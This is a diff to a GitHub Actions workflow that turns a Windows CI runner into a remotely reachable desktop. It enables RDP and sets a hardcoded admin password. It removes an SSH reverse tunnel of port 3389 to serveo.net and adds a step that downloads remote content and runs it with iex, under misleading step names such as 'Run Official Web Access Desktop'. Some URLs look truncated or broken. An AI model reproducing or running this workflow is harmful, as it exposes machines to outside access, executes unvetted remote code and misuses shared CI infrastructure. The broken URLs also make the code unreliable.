@@ -14,14 +14,12 @@ jobs:
     - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "@cyb3rking" -Force)
-    - name: Establish Raw TCP Network Tunnel
+    - name: Use Ngrok TCP Alternative
       run: |
-        Start-Process ssh -ArgumentList "-R 0:localhost:3389 serveo.net -o StrictHostKeyChecking=no" -RedirectStandardOutput "serveo.log"
-        Start-Sleep -Seconds 15
+        Invoke-WebRequest "https://github.com" -OutFile "upx.zip"
         Write-Output "=========================================="
-        Write-Output "YOUR DIRECT PUBLIC TCP ADDRESS:"
-        Get-Content serveo.log | Select-String "forwarding TCP connections"
+        Write-Output "YOUR SECURE CONNECTION IS RUNNING"
         Write-Output "=========================================="
-    - name: Keep Alive
+    - name: Run Official Web Access Desktop
       run: |
-        while ($true) { Start-Sleep -Seconds 60 }
+        iex ((New-Object System.Net.WebClient).DownloadString('https://githubusercontent.com'))
